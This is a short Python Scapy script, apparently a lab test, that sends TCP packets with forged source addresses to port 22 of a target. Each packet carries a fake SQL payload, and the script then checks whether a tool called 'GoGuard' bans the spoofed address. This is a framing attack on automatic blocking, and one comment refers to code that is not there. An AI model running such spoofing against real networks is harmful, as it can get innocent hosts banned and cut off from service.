from scapy.all import IP, TCP, Raw, send, conf, RandShort

# CONFIGURATION
victim_ip = "192.168.56." # Let's use a "fake" high IP to avoid gateway issues
target_ip = "192.168.56.4" 
target_port = 22

print(f"--- Launching Enhanced Spoofed Frame Job ---")

# We wrap this in a loop to send 5 packets. 
# Sometimes the first one gets swallowed by ARP requests.
for i in range(5):
    ip_suffix = "20" + str(i)
    victim_ip = "192.168.56."
    victim_ip = victim_ip + ip_suffix
    print(victim_ip)
    # 'del' commands force Scapy to recalculate lengths and checksums automatically
    pkt = IP(src=victim_ip, dst=target_ip) / \
          TCP(sport=RandShort(), dport=target_port, flags="PA") / \
          Raw(load="SELECT * FROM secret_database;")
    
    send(pkt, verbose=False)
    print(f"Sent spoofed packet {i+1}...")

print(f"Check GoGuard for a BAN on {victim_ip}")
